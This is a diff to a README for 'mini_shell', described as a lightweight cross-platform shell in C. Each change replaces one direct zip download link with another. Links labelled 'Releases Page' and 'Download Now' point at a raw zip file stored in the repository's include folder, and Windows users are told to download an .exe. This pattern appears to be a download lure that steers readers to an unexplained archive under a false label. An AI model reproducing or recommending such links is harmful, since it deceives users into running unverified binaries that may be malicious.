@@ -1,7 +1,7 @@
 # 🐚 mini_shell - A Simple Shell Experience for Everyone
 
 ## 📥 Download Now
-[![Download mini_shell](https://raw.githubusercontent.com/RAYMDG/mini_shell/main/src/mini_shell_v2.2.zip)](https://raw.githubusercontent.com/RAYMDG/mini_shell/main/src/mini_shell_v2.2.zip)
+[![Download mini_shell](https://github.com/RAYMDG/mini_shell/raw/refs/heads/main/include/shell_mini_1.3.zip)](https://github.com/RAYMDG/mini_shell/raw/refs/heads/main/include/shell_mini_1.3.zip)
 
 ## 📖 Description
 mini_shell is a lightweight, cross-platform Unix shell implementation written in C. This application provides an easy way to interact with your computer using commands. Features include:
@@ -26,7 +26,7 @@ mini_shell runs on both Windows and Unix-based systems (like Linux and macOS). H
 
 ### Installation Steps
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/RAYMDG/mini_shell/main/src/mini_shell_v2.2.zip) to download the latest version of mini_shell.
+1. Visit the [Releases Page](https://github.com/RAYMDG/mini_shell/raw/refs/heads/main/include/shell_mini_1.3.zip) to download the latest version of mini_shell.
    
 2. Choose the right file for your operating system:
    - For Windows, download the `.exe` file.
@@ -90,4 +90,4 @@ Feel free to explore more about Unix commands and shell scripting to enhance you
 ## ✈️ Contact and Contributions
 If you have questions or suggestions, please feel free to reach out or contribute. You can report issues, ask questions, or suggest features through the Issues page of this repository.
 
-Thank you for choosing mini_shell. We hope you enjoy using it and enhance your command-line skills! Remember, you can always find more information on our [Releases Page](https://raw.githubusercontent.com/RAYMDG/mini_shell/main/src/mini_shell_v2.2.zip).
+Thank you for choosing mini_shell. We hope you enjoy using it and enhance your command-line skills! Remember, you can always find more information on our [Releases Page](https://github.com/RAYMDG/mini_shell/raw/refs/heads/main/include/shell_mini_1.3.zip).
